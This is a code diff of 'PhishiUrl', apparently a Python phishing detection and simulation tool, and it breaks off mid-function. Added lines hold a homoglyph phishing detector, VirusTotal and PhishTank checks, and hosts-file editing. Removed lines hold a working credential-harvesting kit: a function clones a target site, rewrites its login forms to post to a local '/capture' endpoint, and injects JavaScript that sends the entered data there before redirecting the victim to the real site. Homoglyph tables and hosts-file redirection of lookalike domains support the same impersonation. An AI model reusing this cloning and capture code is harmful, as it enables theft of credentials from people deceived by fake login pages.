@@ -1,1005 +1,1244 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
+"""
+PhishiUrl - Phishing Detection and Simulation Tool
+Author: Emad
+Version: 1.3.0
+GitHub: github.com/EmadYaY
+"""
+
 import click
 import json
 import os
+import sys
+import platform
 import itertools
 import requests
 import re
 import subprocess
+import shutil
+import threading
+import urllib.parse
+from datetime import datetime
+from http.server import HTTPServer, SimpleHTTPRequestHandler
+from io import StringIO
+
 from rich.console import Console
 from rich.table import Table
+from rich.panel import Panel
+from rich import print as rprint
 from pyngrok import ngrok
 from whois import whois
-from http.server import HTTPServer, SimpleHTTPRequestHandler
 import qrcode
 from bs4 import BeautifulSoup
-import urllib.parse
-import win32api
-import win32con
-import win32security
-import shutil
-from datetime import datetime
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
+
+# ──────────────────────────────────────────────
+# Platform detection
+# ──────────────────────────────────────────────
+IS_WINDOWS = platform.system() == "Windows"
+IS_LINUX   = platform.system() == "Linux"
+IS_MAC     = platform.system() == "Darwin"
 
 console = Console()
 
-# Tool and author information
-TOOL_NAME = "PhishiUrl"
+# ──────────────────────────────────────────────
+# Constants
+# ──────────────────────────────────────────────
+TOOL_NAME   = "PhishiUrl"
 AUTHOR_NAME = "Emad"
-VERSION_NUM = "1.2.8"
-GITHUB_URL = "github.com/EmadYaY"
+VERSION_NUM = "1.3.0"
+GITHUB_URL  = "github.com/EmadYaY"
 
-# Unicode mappings for character substitution
-unicode_replacements = [
+# Unicode homoglyph replacements (deduplicated from v1.2.8)
+UNICODE_REPLACEMENTS = [
     {'a': '\u0430'}, {'c': '\u03F2'}, {'e': '\u0435'}, {'o': '\u043E'}, {'p': '\u0440'},
     {'s': '\u0455'}, {'d': '\u0501'}, {'q': '\u051B'}, {'w': '\u051D'},
-    {'m': 'rn'}, {'l': '1'}, {'o': '0'}, {'a': 'α'}, {'e': 'е'}, {'o': 'о'}
+    {'m': 'rn'},     {'l': '1'},      {'a': 'α'},      {'e': 'е'},      {'o': 'о'},
 ]
 
-# Additional Unicode mappings for Persian, Arabic, Kurdish, and Turkish
-extra_unicode_replacements = [
-    {'aleph': '\u0627'}, {'ae': '\u06D5'}, {'waw': '\u0648'}, {'pe': '\u067E'},
-    {'gaf': '\u06AF'}, {'dotless_i': '\u0131'}, {'null': '\x00'}
+EXTRA_UNICODE_REPLACEMENTS = [
+    {'ae': '\u06D5'}, {'waw': '\u0648'}, {'pe': '\u067E'},
+    {'gaf': '\u06AF'}, {'dotless_i': '\u0131'},
 ]
 
-# Keywords to identify login-related inputs
 LOGIN_KEYWORDS = [
-    'user', 'pass', 'login', 'email', 'password', 'username', 'pwd', 'signin', 'auth',
-    'name', 'id', 'account', 'credential', 'key', 'token', 'access', 'log', 'sign'
+    'user', 'pass', 'login', 'email', 'password', 'username', 'pwd',
+    'signin', 'auth', 'name', 'id', 'account', 'credential', 'key',
+    'token', 'access', 'log', 'sign',
 ]
 
-# Load configuration
-def load_config():
-    config_file = 'config.json'
-    default_config = {
-        'ngrok_token': '',
-        'virustotal_api_key': '',
-        'phishtank_api_key': '',
-        'templates_path': './templates'
-    }
+# ──────────────────────────────────────────────
+# Configuration
+# ──────────────────────────────────────────────
+DEFAULT_CONFIG = {
+    'ngrok_token': '',
+    'virustotal_api_key': '',
+    'phishtank_api_key': '',
+    'templates_path': './templates',
+}
 
-    if os.path.exists(config_file):
-        with open(config_file, 'r', encoding='utf-8') as f:
-            config = json.load(f)
-            # Ensure all keys exist
-            for key in default_config:
-                if key not in config:
-                    config[key] = default_config[key]
-            return config
+def _config_path() -> str:
+    """Return path to config.json – always relative to the script's directory."""
+    here = os.path.dirname(os.path.abspath(__file__))
+    return os.path.join(here, '..', 'config.json')
+
+def load_config() -> dict:
+    path = _config_path()
+    if os.path.exists(path):
+        try:
+            with open(path, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+            # Fill in missing keys
+            for k, v in DEFAULT_CONFIG.items():
+                cfg.setdefault(k, v)
+            return cfg
+        except json.JSONDecodeError:
+            console.print("[red]config.json is malformed – using defaults.[/red]")
+    # Write defaults
+    with open(path, 'w', encoding='utf-8') as f:
+        json.dump(DEFAULT_CONFIG, f, indent=2)
+    console.print(f"[green]Created default config: {path}[/green]")
+    return dict(DEFAULT_CONFIG)
+
+def save_config(cfg: dict) -> None:
+    with open(_config_path(), 'w', encoding='utf-8') as f:
+        json.dump(cfg, f, indent=2)
+    console.print("[green]Config saved.[/green]")
+
+# ──────────────────────────────────────────────
+# Admin / privilege helpers
+# ──────────────────────────────────────────────
+def is_admin() -> bool:
+    """Cross-platform admin check."""
+    if IS_WINDOWS:
+        try:
+            import ctypes
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except Exception:
+            return False
     else:
-        # Create a new config file
-        with open(config_file, 'w', encoding='utf-8') as f:
-            json.dump(default_config, f, indent=2)
-        console.print(f"[green]Created new config file: {config_file}[/green]")
-        return default_config
+        return os.geteuid() == 0  # type: ignore[attr-defined]
 
-def save_config(config):
-    """Save updated configuration to config.json."""
-    config_file = 'config.json'
-    with open(config_file, 'w', encoding='utf-8') as f:
-        json.dump(config, f, indent=2)
-    console.print(f"[green]Updated config file: {config_file}[/green]")
+# ──────────────────────────────────────────────
+# Hosts file management (cross-platform)
+# ──────────────────────────────────────────────
+def _hosts_path() -> str:
+    if IS_WINDOWS:
+        return r'C:\Windows\System32\drivers\etc\hosts'
+    return '/etc/hosts'
 
-# Phishing Detection
-class PhishingDetector:
-    def __init__(self):
-        self.suspicious_keywords = ['login', 'verify', 'account']
-        self.unicode_replacements = unicode_replacements + extra_unicode_replacements
-        self.homoglyph_map = {
-            '0': 'o', '1': 'l', '5': 's', 'rn': 'm', 'i': '1', 'o': '0',
-            'l': '1', 's': '5', 'm': 'rn', 'b': '6', 'q': '9', 'vv': 'w'
+def modify_hosts_file(homoglyph_domain: str, ip: str = '127.0.0.1') -> bool:
+    """Add/update a hosts-file entry. Works on Windows, Linux, and macOS."""
+    hosts = _hosts_path()
+    entry = f"{ip} {homoglyph_domain}"
+
+    if not is_admin():
+        console.print(
+            "[red]Admin/root privileges required to modify the hosts file.[/red]\n"
+            f"[yellow]Tip: {'Run as Administrator' if IS_WINDOWS else 'Use sudo'}[/yellow]"
+        )
+        return False
+
+    try:
+        backup = hosts + '.bak'
+        with open(hosts, 'r', encoding='utf-8', errors='replace') as f:
+            lines = f.readlines()
+
+        # Remove old entries for this domain
+        lines = [
+            l for l in lines
+            if homoglyph_domain not in l
+        ]
+        lines.append(f"{entry}\n")
+
+        with open(hosts, 'w', encoding='utf-8') as f:
+            f.writelines(lines)
+
+        # Write backup
+        with open(backup, 'w', encoding='utf-8') as f:
+            f.writelines(lines)
+
+        console.print(f"[green]Hosts file updated: {entry}[/green]")
+        console.print(f"[dim]Backup saved to {backup}[/dim]")
+        return True
+    except PermissionError:
+        console.print("[red]Permission denied while writing hosts file.[/red]")
+        return False
+    except Exception as e:
+        console.print(f"[red]Hosts file error: {e}[/red]")
+        return False
+
+# ──────────────────────────────────────────────
+# Network helpers
+# ──────────────────────────────────────────────
+def test_curl(domain: str) -> dict:
+    """Run a basic HTTP probe. Uses curl if available, else requests."""
+    try:
+        result = subprocess.run(
+            ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}', '--max-time', '5', f'http://{domain}'],
+            capture_output=True, text=True, timeout=8,
+        )
+        code = result.stdout.strip()
+        if code and code != '000':
+            return {'status': f'HTTP {code}', 'reachable': 'UP'}
+    except (FileNotFoundError, subprocess.TimeoutExpired):
+        pass
+
+    # Fallback: requests
+    try:
+        r = requests.get(f'http://{domain}', timeout=5)
+        return {'status': f'HTTP {r.status_code}', 'reachable': 'UP'}
+    except Exception:
+        pass
+
+    return {'status': 'Unreachable', 'reachable': 'DOWN'}
+
+def test_connection(domain: str) -> str:
+    """Ping-based reachability check (cross-platform)."""
+    flag = '-n' if IS_WINDOWS else '-c'
+    try:
+        result = subprocess.run(
+            ['ping', flag, '1', domain],
+            capture_output=True, text=True, timeout=5,
+        )
+        if result.returncode == 0:
+            return "[green]UP[/green]"
+    except (FileNotFoundError, subprocess.TimeoutExpired):
+        pass
+    return "[yellow]DOWN[/yellow]"
+
+# ──────────────────────────────────────────────
+# External API checks
+# ──────────────────────────────────────────────
+def check_virustotal(url: str, api_key: str = '') -> dict:
+    if not api_key:
+        cfg = load_config()
+        api_key = cfg.get('virustotal_api_key', '')
+    if not api_key:
+        return {'error': 'No VirusTotal API key configured'}
+
+    import base64 as _b64
+    vt_headers = {'x-apikey': api_key}
+
+    # Ensure URL has scheme for VT
+    target = url if url.startswith('http') else f'https://{url}'
+
+    # Step 1: Try GET by URL ID
+    url_id = _b64.urlsafe_b64encode(target.encode()).decode().rstrip('=')
+    get_endpoint = f'https://www.virustotal.com/api/v3/urls/{url_id}'
+    try:
+        r = requests.get(get_endpoint, headers=vt_headers, timeout=10)
+        if r.status_code == 200:
+            data = r.json()
+            stats = data.get('data', {}).get('attributes', {}).get('last_analysis_stats', {})
+            malicious = stats.get('malicious', 0)
+            if malicious > 0:
+                return {'status': 'malicious', 'malicious_count': malicious, 'details': stats}
+            return {'status': 'clean', 'details': stats}
+        elif r.status_code == 401:
+            return {'error': 'Invalid VirusTotal API key'}
+        elif r.status_code == 429:
+            return {'error': 'VirusTotal rate limit exceeded (free tier: 4 req/min)'}
+        elif r.status_code in (403, 404):
+            # 403 on free tier for direct GET - submit URL first
+            post_endpoint = 'https://www.virustotal.com/api/v3/urls'
+            pr = requests.post(post_endpoint, headers=vt_headers,
+                               data={'url': target}, timeout=10)
+            if pr.status_code == 200:
+                analysis_id = pr.json().get('data', {}).get('id', '')
+                return {
+                    'status': 'submitted',
+                    'note': 'URL submitted for analysis. Re-run in ~1 minute to get results.',
+                    'analysis_id': analysis_id,
+                }
+            elif pr.status_code == 401:
+                return {'error': 'Invalid VirusTotal API key'}
+            elif pr.status_code == 429:
+                return {'error': 'VirusTotal rate limit exceeded (free tier: 4 req/min)'}
+            return {'error': f'VirusTotal submit failed: HTTP {pr.status_code}'}
+        return {'error': f'VirusTotal HTTP {r.status_code}'}
+    except requests.RequestException as e:
+        return {'error': f'Network error: {e}'}
+
+def check_phishtank(url: str, api_key: str = '') -> dict:
+    if not api_key:
+        cfg = load_config()
+        api_key = cfg.get('phishtank_api_key', '')
+    if not api_key:
+        return {
+            'error': 'PhishTank requires an API key (free at phishtank.org). '
+                     'Add "phishtank_api_key" to config.json'
         }
-        self.deceptive_chars = {'1', '0', '5', 'rn', 'vv', '6', '9'}
+    endpoint = 'https://checkurl.phishtank.com/checkurl/'
+    payload = {'url': url if url.startswith('http') else f'https://{url}',
+               'format': 'json', 'app_key': api_key}
+    try:
+        r = requests.post(endpoint, data=payload, timeout=10)
+        if r.status_code == 200:
+            data = r.json()
+            if data.get('results', {}).get('in_database', False):
+                return {'status': 'malicious', 'details': data['results']}
+            return {'status': 'clean'}
+        elif r.status_code == 403:
+            return {'error': 'PhishTank: invalid or missing API key'}
+        return {'error': f'PhishTank HTTP {r.status_code}'}
+    except requests.RequestException as e:
+        return {'error': f'Network error: {e}'}
 
-    def normalize_domain(self, domain):
-        normalized = domain.lower()
-        for homoglyph, ascii_char in self.homoglyph_map.items():
-            normalized = normalized.replace(homoglyph, ascii_char)
-        for repl in self.unicode_replacements:
-            for char, unicode_char in repl.items():
-                normalized = normalized.replace(unicode_char, char)
-        return normalized
+# ──────────────────────────────────────────────
+# Domain availability
+# ──────────────────────────────────────────────
+def check_domain_availability(domain: str) -> bool:
+    """Return True if domain is AVAILABLE (not registered), False if registered."""
+    try:
+        data = whois(domain)
+        if data and data.registrar:
+            return False
+        return True
+    except Exception:
+        return True  # Assume available on error
 
-    def validate_domain(self, domain):
-        """Check for invalid or unrelated characters."""
-        valid_chars = set('abcdefghijklmnopqrstuvwxyz0123456789-.')
-        allowed_unicode = {v for repl in self.unicode_replacements for v in repl.values()}
-        for c in domain.lower():
-            if c not in valid_chars and c not in allowed_unicode:
-                raise ValueError(f"Invalid character detected: {c} (U+{ord(c):04X})")
+# ──────────────────────────────────────────────
+# Phishing Detection
+# ──────────────────────────────────────────────
+class PhishingDetector:
+    # ASCII chars commonly substituted for letters in phishing domains
+    NUMERIC_SUBS = {'0': 'o', '1': 'l', '5': 's', '6': 'b', '9': 'g', '@': 'a'}
+    # Multi-char visual substitutions
+    MULTI_SUBS   = {'rn': 'm', 'vv': 'w', 'cl': 'd', 'li': 'h'}
+    KEYWORDS     = ['login', 'verify', 'account', 'secure', 'update', 'confirm',
+                    'signin', 'password', 'banking', 'wallet', 'support']
 
-    def detect(self, url):
-        score = 0
+    # Well-known brands to compare normalised domain against
+    KNOWN_BRANDS = [
+        'facebook', 'google', 'paypal', 'apple', 'amazon', 'microsoft',
+        'netflix', 'instagram', 'twitter', 'linkedin', 'yahoo', 'gmail',
+        'outlook', 'dropbox', 'github', 'steam', 'discord', 'twitch',
+        'spotify', 'adobe', 'ebay', 'wellsfargo', 'chase', 'citibank',
+        'bankofamerica', 'whatsapp', 'telegram', 'tiktok', 'snapchat',
+    ]
+
+    def __init__(self):
+        self._unicode_replacements = UNICODE_REPLACEMENTS + EXTRA_UNICODE_REPLACEMENTS
+
+    def _normalize(self, label: str) -> str:
+        """Normalize a domain label by reversing all known substitutions."""
+        d = label.lower()
+        # Multi-char first
+        for sub, orig in self.MULTI_SUBS.items():
+            d = d.replace(sub, orig)
+        # Single numeric/ASCII subs
+        for sub, orig in self.NUMERIC_SUBS.items():
+            d = d.replace(sub, orig)
+        # Unicode homoglyphs → ASCII
+        for repl in self._unicode_replacements:
+            for char, uni in repl.items():
+                d = d.replace(uni, char)
+        return d
+
+    def detect(self, url: str) -> dict:
+        score  = 0
         alerts = []
 
-        domain_match = re.match(r'(?:https?://)?([^/]+)', url)
-        domain = domain_match.group(1) if domain_match else url
+        m = re.match(r'(?:https?://)?([^/?#]+)', url)
+        domain = m.group(1) if m else url
+        label  = domain.lower().split('.')[0]  # first label, e.g. "faceb00k"
 
-        # Validate domain characters
-        try:
-            self.validate_domain(domain)
-        except ValueError as e:
-            console.print(f"[red]Error: {str(e)}[/red]")
-            return {'url': url, 'score': 0, 'alerts': [str(e)], 'is_phishing': False}
-
-        # Homoglyph detection (priority)
-        malicious_chars = []
-        for i in range(len(domain)):
-            c = domain[i]
-            if ord(c) > 127 or c in self.deceptive_chars:
-                malicious_chars.append(c)
-            if i < len(domain) - 1 and domain[i:i+2] in self.deceptive_chars:
-                malicious_chars.append(domain[i:i+2])
-        if malicious_chars:
+        # ── 1. Unicode homoglyph check (Cyrillic/Greek/etc.) ─────────────
+        unicode_chars = [c for c in domain if ord(c) > 127]
+        if unicode_chars:
             score += 60
-            char_details = [f"{c} (U+{ord(c):04X})" if len(c) == 1 else c for c in malicious_chars]
-            alerts.append(f"Phishing due to homoglyph characters: {', '.join(char_details)}")
+            details = [f"{c} (U+{ord(c):04X})" for c in unicode_chars]
+            alerts.append(f"Unicode homoglyph chars: {', '.join(details)}")
 
-        # Suspicious keywords
-        for kw in self.suspicious_keywords:
-            if kw in url.lower():
+        # ── 2. ASCII numeric substitution check (0→o, 1→l, etc.) ─────────
+        found_subs = []
+        for sub_char in self.NUMERIC_SUBS:
+            if sub_char in label:
+                found_subs.append(sub_char)
+        for multi in self.MULTI_SUBS:
+            if multi in label:
+                found_subs.append(multi)
+
+        if found_subs:
+            normalized = self._normalize(label)
+            if normalized in self.KNOWN_BRANDS:
+                # Definite brand impersonation
+                score += 70
+                alerts.append(
+                    f"Brand impersonation: '{label}' → '{normalized}' "
+                    f"(substituted: {found_subs})"
+                )
+            else:
+                # Suspicious substitution chars even without brand match
+                score += 30
+                alerts.append(
+                    f"Suspicious character substitution: {found_subs} in '{label}'"
+                )
+
+        # ── 3. Multi-char visual substitution in full domain ──────────────
+        for multi in self.MULTI_SUBS:
+            if multi in domain.lower() and multi not in str(found_subs):
                 score += 20
-                alerts.append(f"Suspicious keyword: {kw}")
+                alerts.append(f"Visual substitution '{multi}' found in domain")
 
-        # External checks (optional, no score impact unless malicious)
+        # ── 4. Suspicious keyword check ───────────────────────────────────
+        for kw in self.KEYWORDS:
+            if kw in url.lower():
+                score += 15
+                alerts.append(f"Suspicious keyword: '{kw}'")
+
+        # ── 5. URL length heuristic ───────────────────────────────────────
+        if len(url) > 75:
+            score += 10
+            alerts.append(f"Unusually long URL ({len(url)} chars)")
+
+        # ── WHOIS ────────────────────────────────────
         try:
-            whois_status = check_domain_availability(domain)
-            alerts.append(f"WHOIS: {'Registered' if whois_status else 'Available'}")
-        except:
-            alerts.append("WHOIS: Offline")
+            available = check_domain_availability(domain)
+            alerts.append(f"WHOIS: {'Available (unregistered)' if available else 'Registered'}")
+        except Exception:
+            alerts.append("WHOIS: lookup failed")
 
-        curl_result = test_curl(domain)
-        alerts.append(f"Curl: {curl_result['status']}")
-        if curl_result['reachable'] == 'DOWN':
-            alerts.append("Domain not reachable")
+        # ── Reachability ─────────────────────────────
+        curl = test_curl(domain)
+        alerts.append(f"HTTP probe: {curl['status']}")
 
-        try:
-            config = load_config()
-            vt_result = check_virustotal(url, config.get('virustotal_api_key'))
-            if vt_result.get('status') == 'malicious':
-                score += 50
-                alerts.append("VirusTotal flagged as malicious")
-            elif vt_result.get('error'):
-                alerts.append(f"VirusTotal error: {vt_result['error']}")
-            else:
-                alerts.append("VirusTotal: Clean")
-        except:
-            alerts.append("VirusTotal: Offline")
-
-        try:
-            pt_result = check_phishtank(url)
-            if pt_result.get('status') == 'malicious':
-                score += 50
-                alerts.append("PhishTank flagged as malicious")
-            elif pt_result.get('error'):
-                alerts.append(f"PhishTank error: {pt_result['error']}")
-            else:
-                alerts.append("PhishTank: Clean")
-        except:
-            alerts.append("PhishTank: Offline")
-
-        return {'url': url, 'score': score, 'alerts': alerts, 'is_phishing': score >= 60}
-
-# Network Functions
-def test_curl(domain):
-    try:
-        result = subprocess.run(['curl', '-i', '-L', '-s', domain], capture_output=True, text=True, encoding='utf-8', errors='ignore')
-        output = result.stdout
-        if output:
-            status_line = output.split('\n')[0].strip()
-            return {'status': status_line, 'reachable': 'UP'}
-        return {'status': 'Failed', 'reachable': 'DOWN'}
-    except:
-        return {'status': 'Offline', 'reachable': 'DOWN'}
-
-def test_connection(domain):
-    try:
-        result = subprocess.run(['ping', '-n', '1', domain], capture_output=True, text=True)
-        if "Reply from" in result.stdout:
-            return "[green][*][/green] Connection test: UP"
-    except:
-        pass
-    return "[yellow][!][/yellow] Connection test: DOWN"
-
-# VirusTotal Integration
-def check_virustotal(url, api_key=None):
-    config = load_config()
-    if not api_key:
-        api_key = config.get('virustotal_api_key')
-        if not api_key:
-            api_key = click.prompt("Enter VirusTotal API key", hide_input=True)
-            config['virustotal_api_key'] = api_key
-            save_config(config)
-
-    endpoint = "https://www.virustotal.com/vtapi/v2/url/report"
-    params = {'apikey': api_key, 'resource': url}
-    try:
-        response = requests.get(endpoint, params=params)
-        if response.status_code == 200:
-            result = response.json()
-            if result.get('positives', 0) > 0:
-                return {'status': 'malicious', 'details': result}
-            return {'status': 'clean', 'details': result}
-        elif response.status_code == 403:
-            return {'error': 'Invalid or unauthorized VirusTotal API key'}
-        elif response.status_code == 429:
-            return {'error': 'VirusTotal rate limit exceeded'}
-        return {'error': f"Request failed: {response.status_code}"}
-    except Exception as e:
-        return {'error': f"Network error: {str(e)}"}
-
-# PhishTank Integration
-def check_phishtank(url):
-    endpoint = "https://checkurl.phishtank.com/checkurl/"
-    payload = {'url': url, 'format': 'json'}
-    try:
-        response = requests.post(endpoint, data=payload)
-        if response.status_code == 200:
-            result = response.json()
-            if result.get('results', {}).get('in_database', False):
-                return {'status': 'malicious', 'details': result}
-            return {'status': 'clean', 'details': result}
-        return {'error': f"Request failed: {response.status_code}"}
-    except Exception as e:
-        return {'error': f"Network error: {str(e)}"}
-
-# Website Cloning
-def clone_website(url, homoglyph_domain, use_local=False, local_folder=None, download_js=True, download_all=False):
-    """Clone a website page or use local files and modify it for phishing."""
-    try:
-        config = load_config()
-        clone_dir = os.path.join(config['templates_path'], 'cloned', homoglyph_domain.replace('.', '_'))
-        os.makedirs(clone_dir, exist_ok=True)
-
-        # Headers for requests
-        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-
-        if use_local:
-            # Validate local folder
-            if not local_folder or not os.path.isdir(local_folder):
-                console.print(f"[red]Error: Invalid or non-existent folder: {local_folder}[/red]")
-                return None
-            index_path = os.path.join(local_folder, 'index.html')
-            if not os.path.isfile(index_path):
-                console.print(f"[red]Error: index.html not found in {local_folder}[/red]")
-                return None
-
-            # Read index.html
-            with open(index_path, 'r', encoding='utf-8') as f:
-                soup = BeautifulSoup(f, 'html.parser')
-
-            # Copy all files to clone_dir
-            for item in os.listdir(local_folder):
-                src = os.path.join(local_folder, item)
-                dst = os.path.join(clone_dir, item)
-                if os.path.isfile(src):
-                    shutil.copy2(src, dst)
-                elif os.path.isdir(src):
-                    shutil.copytree(src, dst, dirs_exist_ok=True)
-            console.print(f"[green]Copied local files from {local_folder} to {clone_dir}[/green]")
-
+        # ── VirusTotal ───────────────────────────────
+        cfg = load_config()
+        vt = check_virustotal(url, cfg.get('virustotal_api_key', ''))
+        if vt.get('status') == 'malicious':
+            score += 50
+            alerts.append(f"VirusTotal: MALICIOUS ({vt.get('malicious_count', '?')} engines)")
+        elif vt.get('error'):
+            alerts.append(f"VirusTotal: {vt['error']}")
         else:
-            # Step 1: Download the initial HTML using Requests
-            try:
-                response = requests.get(url, headers=headers, timeout=10)
-                response.raise_for_status()
-                soup = BeautifulSoup(response.text, 'html.parser')
-                console.print("[green]Fetched initial page with Requests.[/green]")
-            except Exception as e:
-                console.print(f"[red]Error fetching page with Requests: {str(e)}[/red]")
-                return None
+            alerts.append(f"VirusTotal: {vt.get('status', 'unknown')}")
 
-            # Step 2: Download assets
-            assets_to_download = []
-            
-            # CSS and Favicon (always download)
-            for link in soup.find_all('link'):
-                if link.get('href'):
-                    asset_url = urllib.parse.urljoin(url, link['href'])
-                    assets_to_download.append(('href', link, asset_url))
-            
-            # JavaScript (only if download_js is True)
-            if download_js:
-                for script in soup.find_all('script'):
-                    if script.get('src'):
-                        asset_url = urllib.parse.urljoin(url, script['src'])
-                        assets_to_download.append(('src', script, asset_url))
-            else:
-                console.print("[yellow]Skipping JavaScript download as per user request.[/yellow]")
-            
-            # Images and Fonts (only if download_all is True)
-            if download_all:
-                # All Images
-                for img in soup.find_all('img'):
-                    if img.get('src'):
-                        asset_url = urllib.parse.urljoin(url, img['src'])
-                        assets_to_download.append(('src', img, asset_url))
-                # Fonts (e.g., from CSS links or style tags)
-                for link in soup.find_all('link'):
-                    if link.get('href') and ('font' in link.get('href', '').lower() or link.get('rel') == ['stylesheet']):
-                        asset_url = urllib.parse.urljoin(url, link['href'])
-                        assets_to_download.append(('href', link, asset_url))
-                console.print("[green]Downloading all assets (images, fonts, etc.) as per user request.[/green]")
-            else:
-                # Only potential logos
-                for img in soup.find_all('img'):
-                    if img.get('src'):
-                        is_logo = (
-                            'logo' in img.get('src', '').lower() or
-                            img.find_parent('header') or
-                            any('logo' in cls.lower() for cls in img.get('class', []))
-                        )
-                        if is_logo:
-                            asset_url = urllib.parse.urljoin(url, img['src'])
-                            assets_to_download.append(('src', img, asset_url))
-
-            # Download selected assets
-            for attr, tag, asset_url in assets_to_download:
-                try:
-                    asset_response = requests.get(asset_url, headers=headers, timeout=5)
-                    asset_response.raise_for_status()
-                    # Clean the asset name (remove query parameters)
-                    parsed_url = urllib.parse.urlparse(asset_url)
-                    asset_name = os.path.basename(parsed_url.path)
-                    if not asset_name:
-                        # Generate a name if none exists
-                        ext = '.bin'
-                        if attr == 'href' and 'css' in tag.get('rel', []):
-                            ext = '.css'
-                        elif attr == 'src' and tag.name == 'script':
-                            ext = '.js'
-                        elif attr == 'src' and tag.name == 'img':
-                            ext = os.path.splitext(asset_url)[1] or '.png'
-                        asset_name = f"asset_{hash(asset_url)}{ext}"
-                    asset_path = os.path.join(clone_dir, asset_name)
-                    with open(asset_path, 'wb') as f:
-                        f.write(asset_response.content)
-                    # Update the tag to point to the local file
-                    tag[attr] = asset_name
-                    console.print(f"[green]Downloaded asset: {asset_name}[/green]")
-                except Exception as e:
-                    console.print(f"[yellow]Warning: Failed to download asset {asset_url}: {str(e)}[/yellow]")
-                    # Keep the original URL if download fails
-
-            # Step 3: Use Selenium to analyze the final DOM for inputs and forms
-            try:
-                chrome_options = Options()
-                chrome_options.add_argument('--headless')
-                chrome_options.add_argument('--disable-gpu')
-                chrome_options.add_argument('--disable-tflite')
-                driver = webdriver.Chrome(options=chrome_options)
-                driver.get(url)
-
-                # Wait for inputs to appear (up to 5 seconds)
-                try:
-                    WebDriverWait(driver, 5).until(
-                        EC.presence_of_element_located((By.TAG_NAME, "input"))
-                    )
-                except:
-                    console.print("[yellow]Warning: No inputs found after waiting.[/yellow]")
-
-                # Get the final HTML after JavaScript execution
-                final_html = driver.page_source
-                soup = BeautifulSoup(final_html, 'html.parser')
-                driver.quit()
-                console.print("[green]Analyzed DOM with Selenium to find inputs and forms.[/green]")
-            except Exception as e:
-                console.print(f"[yellow]Warning: Selenium failed ({str(e)}), proceeding with initial HTML.[/yellow]")
-                driver.quit()
-
-        # Find all input tags
-        inputs = soup.find_all('input')
-        if not inputs:
-            console.print(f"[red]Error: No <input> tags found in the page at {url}. At least one input is required for credential capturing.[/red]")
-            console.print("[yellow]You can still proceed to serve the cloned page, but credential capturing will not work.[/yellow]")
-            html_path = os.path.join(clone_dir, 'index.html')
-            with open(html_path, 'w', encoding='utf-8') as f:
-                f.write(str(soup))
-            console.print(f"[green]Cloned page saved to {html_path} (without input capturing)[/green]")
-            return clone_dir
-
-        # Ensure all inputs have a name attribute
-        for idx, input_tag in enumerate(inputs):
-            if not input_tag.get('name'):
-                input_tag['name'] = f"input_{idx}"
-        
-        # Check if inputs are inside a form
-        forms = soup.find_all('form')
-        if forms:
-            for form in forms:
-                # Modify existing forms
-                original_action = form.get('action')
-                if original_action:
-                    original_action = urllib.parse.urljoin(url, original_action) if not use_local else original_action
-                else:
-                    original_action = url
-                
-                form['method'] = 'POST'
-                form['action'] = '/capture'
-
-                # Add original action as hidden input
-                original_action_input = soup.new_tag('input')
-                original_action_input['type'] = 'hidden'
-                original_action_input['name'] = 'original_action'
-                original_action_input['value'] = original_action
-                form.append(original_action_input)
-
-                # Ensure there's a submit button
-                if not form.find('button', type='submit') and not form.find('input', type='submit'):
-                    submit_button = soup.new_tag('button')
-                    submit_button['type'] = 'submit'
-                    submit_button['style'] = 'display: none;'
-                    form.append(submit_button)
-
-            console.print("[green]Found existing forms, modified to capture credentials.[/green]")
+        # ── PhishTank ────────────────────────────────
+        pt = check_phishtank(url, cfg.get('phishtank_api_key', ''))
+        if pt.get('status') == 'malicious':
+            score += 50
+            alerts.append("PhishTank: MALICIOUS")
+        elif pt.get('error'):
+            alerts.append(f"PhishTank: {pt['error']}")
         else:
-            # If no form exists, wrap all inputs in a hidden form
-            input_groups = {}
-            for input_tag in inputs:
-                parent = input_tag.find_parent()
-                if parent not in input_groups:
-                    input_groups[parent] = []
-                input_groups[parent].append(input_tag)
+            alerts.append(f"PhishTank: {pt.get('status', 'unknown')}")
 
-            for parent, group in input_groups.items():
-                new_form = soup.new_tag('form')
-                new_form['method'] = 'POST'
-                new_form['action'] = '/capture'
-                new_form['style'] = 'display: inline;'
-
-                original_action_input = soup.new_tag('input')
-                original_action_input['type'] = 'hidden'
-                original_action_input['name'] = 'original_action'
-                original_action_input['value'] = url
-                new_form.append(original_action_input)
-
-                submit_button = soup.new_tag('button')
-                submit_button['type'] = 'submit'
-                submit_button['style'] = 'display: none;'
-                new_form.append(submit_button)
-
-                first_input = group[0]
-                parent.insert(parent.index(first_input), new_form)
-                for input_tag in group:
-                    input_tag.extract()
-                    new_form.append(input_tag)
-
-            console.print("[green]No form found, added hidden forms around inputs to capture credentials.[/green]")
-
-        # Add JavaScript to capture form submissions
-        script = soup.new_tag('script')
-        script.string = """
-        (function() {
-            // Add submit event listener to all forms
-            document.querySelectorAll('form').forEach(form => {
-                form.addEventListener('submit', function(event) {
-                    event.preventDefault(); // Prevent default form submission
-                    const formData = new FormData(form);
-                    const data = Object.fromEntries(formData);
-                    console.log('Form submitted, captured data:', data);
-                    fetch('/capture', {
-                        method: 'POST',
-                        body: formData
-                    }).then(response => {
-                        console.log('Credentials captured:', response.status);
-                        // Optionally redirect to original action
-                        const originalAction = form.querySelector('input[name="original_action"]');
-                        if (originalAction && originalAction.value) {
-                            window.location.href = originalAction.value;
-                        }
-                    }).catch(err => {
-                        console.error('Capture failed:', err);
-                    });
-                });
-            });
-        })();
-        """
-        body = soup.find('body') or soup.find('html')
-        body.append(script)
-
-        # Save modified HTML
-        html_path = os.path.join(clone_dir, 'index.html')
-        with open(html_path, 'w', encoding='utf-8') as f:
-            f.write(str(soup))
-        console.print(f"[green]Cloned page saved to {html_path}[/green]")
-        return clone_dir
-    except Exception as e:
-        console.print(f"[red]Error cloning website: {str(e)}[/red]")
-        return None
-
-def modify_hosts_file(homoglyph_domain, ip='127.0.0.1'):
-    """Modify Windows hosts file to map homoglyph domain to IP."""
-    hosts_path = r'C:\Windows\System32\drivers\etc\hosts'
-    entry = f"{ip} {homoglyph_domain}\n"
-    try:
-        # Check for admin privileges
-        if not is_admin():
-            console.print("[red]Error: Admin privileges required to modify hosts file. Run as Administrator.[/red]")
-            return False
-
-        # Backup hosts file
